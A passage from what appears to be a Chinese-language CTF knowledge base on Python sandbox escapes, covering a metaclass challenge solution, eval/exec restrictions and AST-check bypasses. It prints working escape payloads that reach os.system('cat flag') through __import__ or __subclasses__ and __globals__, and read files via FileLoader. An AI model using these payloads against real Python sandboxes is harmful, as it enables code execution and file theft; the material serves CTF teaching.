s ) . items () if not name . startswith ( '__' )} return attrs safe_dict = { 'BalsnMetaClass' : BalsnMetaClass , 'MasterMetaClass' : MasterMetaClass , 'False' : False , 'True' : True , 'abs' : abs , 'all' : all , 'any' : any , 'ascii' : ascii , 'bin' : bin , 'bool' : bool , 'bytearray' : bytearray , 'bytes' : bytes , 'chr' : chr , 'complex' : complex , 'dict' : dict , 'dir' : dir , 'divmod' : divmod , 'enumerate' : enumerate , 'filter' : filter , 'float' : float , 'format' : format , 'hash' : hash , 'help' : help , 'hex' : hex , 'id' : id , 'int' : int , 'iter' : iter , 'len' : len , 'list' : list , 'map' : map , 'max' : max , 'min' : min , 'next' : next , 'oct' : oct , 'ord' : ord , 'pow' : pow , 'print' : print , 'range' : range , 'reversed' : reversed , 'round' : round , 'set' : set , 'slice' : slice , 'sorted' : sorted , 'str' : str , 'sum' : sum , 'tuple' : tuple , 'type' : type , 'vars' : secure_vars , 'zip' : zip , '__builtins__' : None } def createMethod ( code ): # if len(code) > 45: # print('Too long!! Bad Guy!!') # return for x in ' _$#@~' : code = code . replace ( x , '' ) def wrapper ( self ): exec ( code , safe_dict , { 'self' : self }) return wrapper def setName ( pattern ): while True : name = input ( f 'Give me your { pattern } name :' ) if ( name . isalpha ()): break else : print ( 'Illegal Name...' ) return name def setAttribute ( cls ): attrName = setName ( 'attribute' ) while True : attrValue = input ( f 'Give me your value:' ) if ( attrValue . isalnum ()): break else : print ( 'Illegal value...' ) setattr ( cls , attrName , attrValue ) def setMethod ( cls ): methodName = setName ( 'method' ) code = input ( f 'Give me your function:' ) func = createMethod ( code ) setattr ( cls , methodName , func ) def getAttribute ( obj ): attrs = [ attr for attr in dir ( obj ) if not callable ( getattr ( obj , attr )) and not attr . startswith ( \"__\" )] x = input ( 'Please enter the attribute \\' s name :' ) if x not in attrs : print ( f 'You can \\' t access the attribute { x } ' ) return else : try : print ( f ' { x } : { getattr ( obj , x ) } ' ) except : print ( \"Something went wrong in your attribute...\" ) return def callMethod ( cls , obj ): attrs = [ attr for attr in dir ( obj ) if callable ( getattr ( obj , attr )) and not attr . startswith ( \"__\" )] x = input ( 'Please enter the method \\' s name :' ) if x not in attrs : print ( f 'You can \\' t access the method { x } ' ) return else : # try: print ( f 'calling method { x } ...' ) cls . __dict__ [ x ]( obj ) print ( 'done' ) # except: # print('Something went wrong in your method...') # return class Guest ( metaclass = BalsnMetaClass ): pass if __name__ == '__main__' : print ( f 'Welcome!!We have prepared a class named \"Guest\" for you' ) cnt = 0 while cnt < 3 : cnt += 1 print ( '1. Add attribute' ) print ( '2. Add method' ) print ( '3. Finish' ) x = input ( \"Option ? :\" ) if x == \"1\" : setAttribute ( Guest ) elif x == \"2\" : setMethod ( Guest ) elif x == \"3\" : break else : print ( \"invalid input.\" ) cnt -= 1 print ( \"Well Done! We Create an instance for you !\" ) obj = Guest () cnt = 0 while cnt < 3 : cnt += 1 print ( '1. Inspect attribute' ) print ( '2. Using method' ) print ( '3. Exit' ) x = input ( \"Option ? :\" ) if x == \"1\" : getAttribute ( obj ) elif x == \"2\" : callMethod ( Guest , obj ) elif x == \"3\" : print ( \"Okay...exit...\" ) break else : print ( \"invalid input.\" ) cnt -= 1 \u4e3b\u8981\u76ee\u6807\u662f\u521b\u5efa\u4e00\u4e2a MasterMetaClass \u7684\u5b9e\u4f8b\u4f46\u4e0d\u8c03\u7528\u5b83\u7684 __init__\u3002\u5e76\u4e14 method method \u9650\u5236\u4e86\u957f\u5ea6 <=45\uff0c\u800c\u4e14 ' \uff08\u7a7a\u683c\uff09_$#@~ ' \u90fd\u4f1a\u88ab\u5220\u6389\uff0c\u5185\u90e8 exec \u7684 globals \u4e5f\u7ed9\u4e86\u9650\u5236 \u76f4\u63a5\u8c03\u7528 MasterMetaClass \u6765\u5b9e\u4f8b\u5316\u4f1a\u6267\u884c __call__ \u548c __init__\uff0c\u76f4\u63a5\u8c03\u7528 __new__ \u53c8\u4f1a\u88ab\u9650\u5236\u4e0d\u80fd\u8f93\u5165\u4e0b\u5212\u7ebf \u521b\u5efa\u4e00\u4e2a\u5143\u7c7b\u53ef\u4ee5\u4f7f\u7528 type(name, bases, dict) \uff0c\u8fd4\u56de\u503c\u662f\u4e00\u4e2a\u7c7b\uff0c\u53c2\u6570\u662f\uff1a name : It is a string which basically represents the name of the class . bases : It is a tuple that specifies the base classes of the main class . dict : It is a \u2018 dictionary \u2018 that is used to create body of the class specified. \u6240\u4ee5\u76f4\u63a5\u4f7f\u7528 type \u521b\u5efa\u4e00\u4e2a\u65b0\u7684 metaclass\uff0c\u8ba9\u5b83\u57fa\u4e8e\uff08\u4e5f\u5c31\u662f bases \u53c2\u6570\u5185\u5bb9\uff09MasterMetaClass\uff0c\u5e76\u4e14\u8986\u76d6\u6389\u5b83\u7684 __init__\uff0c\u6240\u4ee5\u6700\u7ec8\u7684 payload \u53ef\u4ee5\u6839\u636e\u8fd9\u4e2a\u6765\u6539\u5199\uff1a type ( \"\" , ( MasterMetaClass ,), { \"__init__\" : print })( \"\" ,(),{}) . IWantGETFLAGPlz ( 1 ) \u56e0\u4e3a\u8fd9\u65f6\u7684\u4e0b\u5212\u7ebf\u5728\u5f15\u53f7\u4e2d\uff0c\u6240\u4ee5\u53ef\u4ee5\u4f7f\u7528 \"\\x5f\" \u6765\u4ee3\u66ff payload add method x : e = \" \\x5f \" * 2 ; self . d = { e + \"init\" + e : print } add method y : self . m = type ( '' ,( MasterMetaClass ,), self . d ) add method z : self . m ( '' ,(),{}) . IWantGETFLAGPlz ( 1 ) call x call y call z Reference \u00b6 TokyoWesterns CTF 4th 2018 Writeup \u2014 Part 5 Documentation of ast \u4e00\u6587\u770b\u61c2Python\u6c99\u7bb1\u9003\u9038 - FreeBuf\u7f51\u7edc\u5b89\u5168\u884c\u4e1a\u95e8\u6237 https://blog.gztime.cc/posts/2021/83a30666/","title":"Python \u6c99\u7bb1\u9003\u9038"},{"location":"ctf/escapes/pysandbox/#python","text":"","title":"Python \u6c99\u7bb1\u9003\u9038"},{"location":"ctf/escapes/pysandbox/#_1","text":"Python \u91cc\u7684 eval \u548c exec \u53ef\u4ee5\u7528\u6765\u6267\u884c\u4e00\u4e9b\u4ee3\u7801\u6765\u5e72\u574f\u4e8b \u4f46\u662f\u9898\u76ee\u90fd\u4f1a\u7ed9\u4e00\u4e9b\u5947\u5947\u602a\u602a\u7684\u3001\u770b\u8d77\u6765\u4e25\u5bc6\u7684\u9650\u5236\u9632\u6b62\u5e72\u574f\u4e8b \u8fd9\u65f6\u5019\u5c31\u8981\u627e\u65b9\u6cd5\u7ed5\u8fc7\u9650\u5236\u6765\u5e72\u574f\u4e8b\uff0c\u4e5f\u5c31\u662f\u6c99\u7bb1\u9003\u9038","title":"\u4e3a\u4ec0\u4e48\u9003\u9038\uff1f"},{"location":"ctf/escapes/pysandbox/#eval-exec","text":"eval ( expression [, globals [, locals ]]) exec ( expression [, globals [, locals ]]) \u53ef\u4ee5\u770b\u51fa\u5b83\u4eec\u7684\u7528\u6cd5\u5927\u4f53\u76f8\u4f3c\uff0c\u53c2\u6570\u6709\u8981\u6267\u884c\u7684\u8868\u8fbe\u5f0f expression \uff0c\u5168\u5c40\u53d8\u91cf globals \uff08\u5fc5\u987b\u662f\u5b57\u5178\uff09\uff0c\u5c40\u90e8\u53d8\u91cf locals \uff08\u4efb\u610f mapping object\uff0c\u4e00\u822c\u4e5f\u662f\u5b57\u5178\uff09 \u4e0d\u540c\u7684\u662f eval \u628a\u8868\u8fbe\u5f0f\u8ba1\u7b97\u51fa\u6765\uff0c\u628a\u7ed3\u679c\u8fd4\u56de\uff0c\u5e76\u4e0d\u4f1a\u5f71\u54cd\u5f53\u524d\u73af\u5883 \u800c exec \u628a\u8868\u8fbe\u5f0f\u4f5c\u4e3apy\u8bed\u53e5\u6765\u6267\u884c\uff0c\u53ef\u4ee5\u8fdb\u884c\u8d4b\u503c\u7b49\u64cd\u4f5c\uff08\u9898\u76ee\u91cc exec \u4e0d\u5e38\u89c1\uff09","title":"eval \u548c exec \u6709\u4ec0\u4e48\u533a\u522b"},{"location":"ctf/escapes/pysandbox/#eval-exec_1","text":"\u53ef\u4ee5\u770b\u51fa\uff0ceval \u548c exec \u90fd\u5305\u542b\u53c2\u6570 globals locals\uff0c\u53ef\u4ee5\u6307\u5b9a\u5b83\u4eec\u4e3a\u7a7a\u5b57\u5178\u4f7f\u5176\u8bbf\u95ee\u4e0d\u5230\u5168\u5c40\u53d8\u91cf\u548c\u5c40\u90e8\u53d8\u91cf \u800c\u6bd4\u8f83\u7279\u522b\u7684\u5c31\u662f __builtins__ \uff0c\u5373\u5185\u7f6e\u51fd\u6570\u3002\u5982\u679c globals \u4e2d\u6ca1\u6709\u952e builtins \uff0c\u5219\u4f1a\u81ea\u52a8\u5c06\u5176\u63d2\u5165\uff0c\u800c\u770b\u6587\u6863 https://docs.python.org/3/library/functions.html \u53ef\u4ee5\u53d1\u73b0\u5176\u4e2d\u6709\u51fd\u6570 open \u548c __import__ \u53ef\u4ee5\u7528\u6765\u5e72\u574f\u4e8b\uff0c\u6240\u4ee5\u4e00\u822c\u4f1a\u4f20\u5165 globals \u4e3a {'__builtins__': {}} \u4f7f\u5176\u65e0\u6cd5\u4f7f\u7528\u5185\u7f6e\u51fd\u6570","title":"eval \u548c exec \u5982\u4f55\u6784\u9020\u6c99\u7bb1"},{"location":"ctf/escapes/pysandbox/#astliteral_eval","text":"\u5373\u4f7f eval \u548c exec \u7ed9\u4e86\u8fd9\u6837\u7684\u9650\u5236\uff0c\u90a3\u80af\u5b9a\u8fd8\u662f\u4f1a\u6709\u6f0f\u6d1e\u7684\uff08\u4e0d\u7136\u5c31\u6ca1\u8fd9\u7bc7\u6587\u7ae0\u4e86\uff09 \u90a3\u6709\u6ca1\u6709\u66f4\u5b89\u5168\u7684 eval\uff1f ast \u6a21\u5757\u4e2d\u7684 literal_eval \u5c31\u4f1a\u66f4\u52a0\u5b89\u5168\uff0c\u76ee\u524d\u8c8c\u4f3c\u5e76\u65e0\u7a81\u7834\u65b9\u6cd5\uff0c\u6240\u4ee5\u9898\u76ee\u91cc\u662f ast.literal_eval \u57fa\u672c\u4e0a\u5c31\u4e0d\u662f\u6c99\u7bb1\u9003\u9038\u4e86_(:\u0437\u300d\u2220)_","title":"ast.literal_eval"},{"location":"ctf/escapes/pysandbox/#_2","text":"","title":"\u600e\u4e48\u9003\u9038\uff1f"},{"location":"ctf/escapes/pysandbox/#expression-eval","text":"\u8fd9\u65f6\u53ea\u8981\u7ed5\u8fc7 expression \u7684\u9650\u5236\u5c31\u53ef\u4ee5\u4e86 \u6bd4\u5982\u8fc7\u6ee4\u4e86 system\u3001open\u3001ls\u3001cat \u7b49\u654f\u611f\u8bcd \u8fd9\u6837\u53ef\u4ee5\u7528\u5b57\u7b26\u4e32\u62fc\u63a5\uff0c\u6216\u8005\u628a bytes decode \u6210\u5b57\u7b26\u4e32\u6765\u7ed5\u8fc7 \u4e5f\u53ef\u4ee5\u7528\u73b0\u6709\u5b57\u7b26\u4e32\uff08 ?.__doc__ \uff09\u901a\u8fc7\u7d22\u5f15\u6765\u62fc\u63a5\u6210\u9700\u8981\u7684\u5b57\u7b26\u4e32 \u5982\u679c\u662f\u8fc7\u6ee4\u4e86\u6570\u5b57\u7684\u8bdd\u5219\u53ef\u4ee5\u7528 True\u3001False \uff08\u6216 []==[]\u3001[]<[] \uff09\u6765\u52a0\u51cf\u4e58\u9664\u5f00\u65b9\u79fb\u4f4d\u5f97\u5230\u6570\u5b57","title":"\u4ec5\u68c0\u67e5\u4e86 expression\uff0c\u4f46 eval \u6ca1\u6709\u9650\u5236"},{"location":"ctf/escapes/pysandbox/#import","text":"\u53ef\u4ee5\u7528 __import__ \u6765\u624b\u52a8 import\uff0c\u5177\u4f53\uff1a __import__(package) \u5f97\u5230\u7684\u5c31\u662f\u8fd9\u4e2apackage\u3001\u6216\u8005\u7528 importlib.import_module \u6765\u5bfc\u5165\u4e00\u4e2a\u5305 __import__ ( os ) . system ( \"cat flag\" ) importlib . import_module ( \"os\" ); os . system ( \"cat flag\" )","title":"\u6ca1\u6709 import"},{"location":"ctf/escapes/pysandbox/#__builtins__","text":"\u53ef\u4ee5\u5c1d\u8bd5\u7528 imp.reload \u6216 importlib.reload \u6765\u91cd\u65b0\u5bfc\u5165 __builtins__","title":"\u4ec5\u6e05\u7a7a\u4e86 __builtins__"},{"location":"ctf/escapes/pysandbox/#eval","text":"","title":"eval \u628a\u73af\u5883\u6e05\u7a7a\u4e86"},{"location":"ctf/escapes/pysandbox/#object","text":"python \u4e2d\u4e00\u5207\u7686\u5bf9\u8c61\uff0c\u53ef\u4ee5\u901a\u8fc7\u4efb\u610f\u4e1c\u897f\u6765\u627e\u5230 object \u8fd9\u4e2a\u7c7b\uff1a [] . __class__ . __base__ [] . __class__ . __bases__ [ 0 ] [] . __class__ . __mro__ [ - 1 ] () . __class__ . __base__ ... {} .... '' .... ... \u7136\u540e\u83b7\u53d6\u5b83\u7684\u5b50\u7c7b\uff1a [] . __class__ . __base__ . __subclasses__ () subclasses ( 0 , < class ' type '>) ( 1 , < class ' weakref '>) ( 2 , < class ' weakcallableproxy '>) ( 3 , < class ' weakproxy '>) ( 4 , < class ' int '>) ( 5 , < class ' bytearray '>) ( 6 , < class ' bytes '>) ( 7 , < class ' list '>) ( 8 , < class ' NoneType '>) ( 9 , < class ' NotImplementedType '>) ( 10 , < class ' traceback '>) ( 11 , < class ' super '>) ( 12 , < class ' range '>) ( 13 , < class ' dict '>) ( 14 , < class ' dict_keys '>) ( 15 , < class ' dict_values '>) ( 16 , < class ' dict_items '>) ( 17 , < class ' dict_reversekeyiterator '>) ( 18 , < class ' dict_reversevalueiterator '>) ( 19 , < class ' dict_reverseitemiterator '>) ( 20 , < class ' odict_iterator '>) ( 21 , < class ' set '>) ( 22 , < class ' str '>) ( 23 , < class ' slice '>) ( 24 , < class ' staticmethod '>) ( 25 , < class ' complex '>) ( 26 , < class ' float '>) ( 27 , < class ' frozenset '>) ( 28 , < class ' property '>) ( 29 , < class ' managedbuffer '>) ( 30 , < class ' memoryview '>) ( 31 , < class ' tuple '>) ( 32 , < class ' enumerate '>) ( 33 , < class ' reversed '>) ( 34 , < class ' stderrprinter '>) ( 35 , < class ' code '>) ( 36 , < class ' frame '>) ( 37 , < class ' builtin_function_or_method '>) ( 38 , < class ' method '>) ( 39 , < class ' function '>) ( 40 , < class ' mappingproxy '>) ( 41 , < class ' generator '>) ( 42 , < class ' getset_descriptor '>) ( 43 , < class ' wrapper_descriptor '>) ( 44 , < class ' method - wrapper '>) ( 45 , < class ' ellipsis '>) ( 46 , < class ' member_descriptor '>) ( 47 , < class ' types . SimpleNamespace '>) ( 48 , < class ' PyCapsule '>) ( 49 , < class ' longrange_iterator '>) ( 50 , < class ' cell '>) ( 51 , < class ' instancemethod '>) ( 52 , < class ' classmethod_descriptor '>) ( 53 , < class ' method_descriptor '>) ( 54 , < class ' callable_iterator '>) ( 55 , < class ' iterator '>) ( 56 , < class ' pickle . PickleBuffer '>) ( 57 , < class ' coroutine '>) ( 58 , < class ' coroutine_wrapper '>) ( 59 , < class ' InterpreterID '>) ( 60 , < class ' EncodingMap '>) ( 61 , < class ' fieldnameiterator '>) ( 62 , < class ' formatteriterator '>) ( 63 , < class ' BaseException '>) ( 64 , < class ' hamt '>) ( 65 , < class ' hamt_array_node '>) ( 66 , < class ' hamt_bitmap_node '>) ( 67 , < class ' hamt_collision_node '>) ( 68 , < class ' keys '>) ( 69 , < class ' values '>) ( 70 , < class ' items '>) ( 71 , < class ' Context '>) ( 72 , < class ' ContextVar '>) ( 73 , < class ' Token '>) ( 74 , < class ' Token . MISSING '>) ( 75 , < class ' moduledef '>) ( 76 , < class ' module '>) ( 77 , < class ' filter '>) ( 78 , < class ' map '>) ( 79 , < class ' zip '>) ( 80 , < class ' _frozen_importlib . _ModuleLock '>) ( 81 , < class ' _frozen_importlib . _DummyModuleLock '>) ( 82 , < class ' _frozen_importlib . _ModuleLockManager '>) ( 83 , < class ' _frozen_importlib . ModuleSpec '>) ( 84 , < class ' _frozen_importlib . BuiltinImporter '>) ( 85 , < class ' classmethod '>) ( 86 , < class ' _frozen_importlib . FrozenImporter '>) ( 87 , < class ' _frozen_importlib . _ImportLockContext '>) ( 88 , < class ' _thread . _localdummy '>) ( 89 , < class ' _thread . _local '>) ( 90 , < class ' _thread . lock '>) ( 91 , < class ' _thread . RLock '>) ( 92 , < class ' _frozen_importlib_external . WindowsRegistryFinder '>) ( 93 , < class ' _frozen_importlib_external . _LoaderBasics '>) ( 94 , < class ' _frozen_importlib_external . FileLoader '>) ( 95 , < class ' _frozen_importlib_external . _NamespacePath '>) ( 96 , < class ' _frozen_importlib_external . _NamespaceLoader '>) ( 97 , < class ' _frozen_importlib_external . PathFinder '>) ( 98 , < class ' _frozen_importlib_external . FileFinder '>) ( 99 , < class ' _io . _IOBase '>) ( 100 , < class ' _io . _BytesIOBuffer '>) ( 101 , < class ' _io . IncrementalNewlineDecoder '>) ( 102 , < class ' posix . ScandirIterator '>) ( 103 , < class ' posix . DirEntry '>) ( 104 , < class ' zipimport . zipimporter '>) ( 105 , < class ' zipimport . _ZipImportResourceReader '>) ( 106 , < class ' codecs . Codec '>) ( 107 , < class ' codecs . IncrementalEncoder '>) ( 108 , < class ' codecs . IncrementalDecoder '>) ( 109 , < class ' codecs . StreamReaderWriter '>) ( 110 , < class ' codecs . StreamRecoder '>) ( 111 , < class ' _abc_data '>) ( 112 , < class ' abc . ABC '>) ( 113 , < class ' dict_itemiterator '>) ( 114 , < class ' collections . abc . Hashable '>) ( 115 , < class ' collections . abc . Awaitable '>) ( 116 , < class ' collections . abc . AsyncIterable '>) ( 117 , < class ' async_generator '>) ( 118 , < class ' collections . abc . Iterable '>) ( 119 , < class ' bytes_iterator '>) ( 120 , < class ' bytearray_iterator '>) ( 121 , < class ' dict_keyiterator '>) ( 122 , < class ' dict_valueiterator '>) ( 123 , < class ' list_iterator '>) ( 124 , < class ' list_reverseiterator '>) ( 125 , < class ' range_iterator '>) ( 126 , < class ' set_iterator '>) ( 127 , < class ' str_iterator '>) ( 128 , < class ' tuple_iterator '>) ( 129 , < class ' collections . abc . Sized '>) ( 130 , < class ' collections . abc . Container '>) ( 131 , < class ' collections . abc . Callable '>) ( 132 , < class ' os . _wrap_close '>) ( 133 , < class ' _sitebuiltins . Quitter '>) ( 134 , < class ' _sitebuiltins . _Printer '>) ( 135 , < class ' _sitebuiltins . _Helper '>) ( 136 , < class ' types . DynamicClassAttribute '>) ( 137 , < class ' types . _GeneratorWrapper '>) ( 138 , < class ' warnings . WarningMessage '>) ( 139 , < class ' warnings . catch_warnings '>) ( 140 , < class ' importlib . abc . Finder '>) ( 141 , < class ' importlib . abc . Loader '>) ( 142 , < class ' importlib . abc . ResourceReader '>) ( 143 , < class ' operator . itemgetter '>) ( 144 , < class ' operator . attrgetter '>) ( 145 , < class ' operator . methodcaller '>) ( 146 , < class ' itertools . accumulate '>) ( 147 , < class ' itertools . combinations '>) ( 148 , < class ' itertools . combinations_with_replacement '>) ( 149 , < class ' itertools . cycle '>) ( 150 , < class ' itertools . dropwhile '>) ( 151 , < class ' itertools . takewhile '>) ( 152 , < class ' itertools . islice '>) ( 153 , < class ' itertools . starmap '>) ( 154 , < class ' itertools . chain '>) ( 155 , < class ' itertools . compress '>) ( 156 , < class ' itertools . filterfalse '>) ( 157 , < class ' itertools . count '>) ( 158 , < class ' itertools . zip_longest '>) ( 159 , < class ' itertools . permutations '>) ( 160 , < class ' itertools . product '>) ( 161 , < class ' itertools . repeat '>) ( 162 , < class ' itertools . groupby '>) ( 163 , < class ' itertools . _grouper '>) ( 164 , < class ' itertools . _tee '>) ( 165 , < class ' itertools . _tee_dataobject '>) ( 166 , < class ' reprlib . Repr '>) ( 167 , < class ' collections . deque '>) ( 168 , < class ' _collections . _deque_iterator '>) ( 169 , < class ' _collections . _deque_reverse_iterator '>) ( 170 , < class ' _collections . _tuplegetter '>) ( 171 , < class ' collections . _Link '>) ( 172 , < class ' functools . partial '>) ( 173 , < class ' functools . _lru_cache_wrapper '>) ( 174 , < class ' functools . partialmethod '>) ( 175 , < class ' functools . singledispatchmethod '>) ( 176 , < class ' functools . cached_property '>) ( 177 , < class ' contextlib . ContextDecorator '>) ( 178 , < class ' contextlib . _GeneratorContextManagerBase '>) ( 179 , < class ' contextlib . _BaseExitStack '>) ( 180 , < class ' rlcompleter . Completer '>)","title":"\u627e object \u7684\u5b50\u7c7b"},{"location":"ctf/escapes/pysandbox/#_3","text":"\u53ef\u4ee5\u5c1d\u8bd5\u4ece\u67d0\u4e9b\u7c7b\u7684 __init__ \u91cc\u9762\u641e\u5230 __globals__ \uff0c\u6bd4\u5982\uff1a [] . __class__ . __base__ . __subclasses__ ()[ - 2 ] . __init__ . __globals__ [ 'sys' ] . modules [ 'os' ] . system ( \"cat flag\" ) \u4e5f\u53ef\u4ee5\u5229\u7528\u5b50\u7c7b\u91cc\u9762\u7684\u5371\u9669\u7c7b\uff1a ( 37 , < class ' builtin_function_or_method '>) ( 94 , < class ' _frozen_importlib_external . FileLoader '>) ( 132 , < class ' os . _wrap_close '>) \u6bd4\u5982\uff1a [] . __class__ . __base__ . __subclasses__ ()[ 94 ] . get_data ( \"\" , \"flag\" ) [] . __class__ . __base__ . __subclasses__ ()[ 132 ] . close . __globals__ [ \"system\" ]( \"cat flag\" ) python2 \u91cc\u8fd8\u6709 file \u53ef\u4ee5\u76f4\u63a5 open","title":"\u641e\u4e8b"},{"location":"ctf/escapes/pysandbox/#ast","text":"\u5177\u4f53\u76f8\u5bf9\u590d\u6742\uff0c\u5355\u72ec\u5217\u51fa\u4e00\u6761\uff0c\u89c1\u4e0b\u9762","title":"\u7ed5\u8fc7 AST \u68c0\u6d4b"},{"location":"ctf/escapes/pysandbox/#ast_1","text":"\u8fd9\u7c7b\u9898\u76ee\u4e0d\u50cf\u666e\u901a\u7684\u6c99\u7bb1\u9003\u9038\u4e00\u6837\u901a\u8fc7\u5220\u9664\u5185\u7f6e\u51fd\u6570\u5b57\u5178\u6216\u8005\u5220\u9664\u67d0\u4e9b\u6a21\u5757\u7684\u5185\u5bb9\u6765\u5b9e\u73b0 \u800c\u662f\u5728\u8f93\u5165\u547d\u4ee4\u540e\u5373\u4f7f\u7528python\u7684 ast \u6a21\u5757\u5bf9\u5176\u8fdb\u884c\u8bed\u6cd5\u5206\u6790\uff0c\u53ea\u8981\u4f7f\u7528\u4e86\u67d0\u4e9b\u7981\u6b62\u7684\u62bd\u8c61\u8bed\u6cd5\uff0c\u5c31\u629b\u51fa\u5f02\u5e38\u5bfc\u81f4\u7a0b\u5e8f\u4e2d\u65ad \u56e0\u4e3a\u5b83\u76f4\u63a5\u4f7f\u7528 ast.parse \u5206\u6790\u4e86\u8bed\u6cd5\uff0c\u6240\u4ee5\u5f88\u96be\u8499\u6df7\u8fc7\u5173\u9a97\u8fc7 ast\uff0c\u8fd9\u65f6\u5c31\u9700\u8981\u5bfb\u627e\u9898\u76ee\u4e2d\u904d\u5386\u8bed\u6cd5\u6811\u7684\u6f0f\u6d1e\u4e86 \u5148\u6765\u770b\u770b cy \u7684 pysandbox13\uff0c\u8fd9\u4e2a\u6700\u7ec8\u7248\u7684 AST \u68c0\u67e5\u7ed5\u8fc7 \u9898\u76ee\u4ee3\u7801 dbgprint = sys . stderr . write class Traversal (): def __init__ ( self , node ): self . tisiv ( node ) depth = - 1 def tisiv ( self , nodes ): if not isinstance ( nodes , list ): nodes = [ nodes ] self . depth += 1 for node in nodes : func = getattr ( self , 'tisiv_' + node . __class__ . __name__ , None ) if func : dbgprint ( \" \" * self . depth + \"tisiv\" [:: - 1 ] + \" \\t \" + node . __class__ . __name__ + \" \\n \" ) return func ( node ) else : if not isinstance ( node , ast . expr ): raise Exception ( \"not allowed \" + str ( node )) self . depth -= 1 def tisiv_Call ( self , node ): raise Exception ( \"not allowed\" ) self . tisiv ( node . func ) self . tisiv ( node . args ) self . tisiv ( node . keywords ) def tisiv_Attribute ( self , node ): raise Exception ( \"not allowed\" ) self . tisiv ( node . value ) self . tisiv ( node . attr ) self . tisiv ( node . ctx ) def tisiv_Import ( self , node ): raise Exception ( \"not allowed\" ) def tisiv_Module ( self , node ): self . tisiv ( node . body ) def tisiv_BoolOp ( self , node ): self . tisiv ( node . values ) def tisiv_BinOp ( self , node ): self . tisiv ( node . left ) self . tisiv ( node . right ) def tisiv_UnaryOp ( self , node ): self . tisiv ( node . operand ) def tisiv_Lambda ( self , node ): self . tisiv ( node . body ) self . tisiv ( node . args ) def tisiv_IfExp ( self , node ): self . tisiv ( node . test ) self . tisiv ( node . body ) self . tisiv ( node . orelse ) def tisiv_Dict ( self , node ): self . tisiv ( node . keys ) self . tisiv ( node . values ) def tisiv_Set ( self , node ): self . tisiv ( node . elts ) def tisiv_ListComp ( self , node ): self . tisiv ( node . elt ) self . tisiv ( node . generators ) def tisiv_SetComp ( self , node ): self . tisiv ( node . elt ) self . tisiv ( node . generators ) def tisiv_DictComp ( self , node ): self . tisiv ( node . key ) self . tisiv ( node . value ) self . tisiv ( node . generators ) def tisiv_GeneratorExp ( self , node ): self . tisiv ( node . elt ) self . tisiv ( node . generators ) def tisiv_Yield ( self , node ): self . tisiv ( node . value ) def tisiv_Compare ( self , node ): self . tisiv ( node . left ) self . tisiv ( node . comparators ) def tisiv_Repr ( self , node ): self . tisiv ( node . value ) def tisiv_Subscript ( self , node ): self . tisiv ( node . value ) self . tisiv ( node . slice ) def tisiv_List ( self , node ): self . tisiv ( node . elts ) def tisiv_Tuple ( self , node ): self . tisiv ( node . elts ) def tisiv_Expr ( self , node ): self . tisiv ( node . value ) def tisiv_JoinedStr ( self , node ): self . tisiv ( node . values ) def tisiv_NameConstant ( self , node ): pass Traversal ( ast . parse ( c )) \u53ef\u4ee5\u8bfb\u51fa\uff0c\u5b83\u5b9a\u4e49\u4e86\u4e00\u4e2a Traversal \u7c7b\uff0c\u5728\u521d\u59cb\u5316\u7684\u65f6\u5019\u5bf9\u4f20\u5165\u7684\u8282\u70b9\u8c03\u7528 tisiv \u65b9\u6cd5\uff0c\u5373\u5bf9\u5176\u6240\u6709\u5b50\u8282\u70b9\u7ee7\u7eed\u9010\u5c42\u68c0\u67e5 \u5982\u679c tisiv_{\u8be5\u8282\u70b9\u7c7b\u540d} \u5df2\u7ecf\u6709\u4e86\u5b58\u5728\u7684\u65b9\u6cd5\uff0c\u5c31\u8c03\u7528\u5b83\uff0c\u5728\u90a3\u4e9b\u65b9\u6cd5\u4e2d\u53c8\u5206\u522b\u5bf9\u5176\u5b50\u8282\u70b9\u8fdb\u884c\u4e86\u68c0\u67e5 \u5982\u679c\u4e0d\u5b58\u5728\u8fd9\u6837\u7684\u65b9\u6cd5\uff0c\u5c31\u68c0\u6d4b\u8fd9\u4e2a\u8282\u70b9\u7684\u8bed\u6cd5\u7c7b\u578b\u662f\u4e0d\u662f ast.expr\uff0c\u5982\u679c\u4e0d\u662f\u5c31\u76f4\u63a5\u7981\u6b62 \u518d\u770b TokyoWesterns CTF 4th 2018 \u7684\u4e00\u9053\u9898\uff1a \u9898\u76ee\u4ee3\u7801 def check ( node ): if isinstance ( node , list ): return all ([ check ( n ) for n in node ]) else : attributes = { 'BoolOp' : [ 'values' ], 'BinOp' : [ 'left' , 'right' ], 'UnaryOp' : [ 'operand' ], 'Lambda' : [ 'body' ], 'IfExp' : [ 'test' , 'body' , 'orelse' ], 'Dict' : [ 'keys' , 'values' ], 'Set' : [ 'elts' ], 'ListComp' : [ 'elt' , 'generators' ], 'SetComp' : [ 'elt' , 'generators' ], 'DictComp' : [ 'key' , 'value' , 'generators' ], 'GeneratorExp' : [ 'elt' , 'generators' ], 'Yield' : [ 'value' ], 'Compare' : [ 'left' , 'comparators' ], 'Call' : False , # call is not permitted 'Repr' : [ 'value' ], 'Num' : True , 'Str' : True , 'Attribute' : False , # attribute is also not permitted 'Subscript' : [ 'value' ], 'Name' : True , 'List' : [ 'elts' ], 'Tuple' : [ 'elts' ], 'Expr' : [ 'value' ], # root node 'comprehension' : [ 'target' , 'iter' , 'ifs' ], } for k , v in attributes . items (): if hasattr ( ast , k ) and isinstance ( node , getattr ( ast , k )): if isinstance ( v , bool ): return v return all ([ check ( getattr ( node , attr )) for attr in v ]) if __name__ == '__main__' : expr = sys . stdin . readline () body = ast . parse ( expr ) . body \u8fd9\u9053\u9898\u76ee\u7684\u4ee3\u7801\u5c31\u66f4\u52a0\u660e\u786e\u4e86\uff0c\u9053\u7406\u662f\u7c7b\u4f3c\u7684 \u6b63\u5982\u524d\u9762\u8bf4\u7684\uff0c\u6211\u4eec\u9700\u8981\u627e\u68c0\u67e5\u7a0b\u5e8f\u4e2d\u7684\u6f0f\u6d1e","title":"\u7ed5\u8fc7 AST \u68c0\u6d4b\u9003\u9038"},{"location":"ctf/escapes/pysandbox/#_4","text":"\u6211\u4eec\u53d1\u73b0\uff0c\u5728\u9898\u76ee\u7684\u7a0b\u5e8f\u4e2d\uff0c\u90fd\u662f\u624b\u52a8\u7f16\u5199\u4e86\u5bf9\u67d0\u4e2a\u62bd\u8c61\u8bed\u6cd5\u7684\u54ea\u4e9b\u90e8\u5206\u8fdb\u884c\u68c0\u6d4b\uff0c\u6240\u4ee5\u53ef\u80fd\u5c31\u4f1a\u51fa\u73b0\u67d0\u4e2a\u8bed\u6cd5\u7684\u67d0\u4e2a\u90e8\u5206\u6ca1\u88ab\u68c0\u6d4b\u5230\u7684\u60c5\u51b5\u3002 \u8fd9\u65f6\u5019\u5c31\u53ef\u4ee5\u53bb\u548c AST 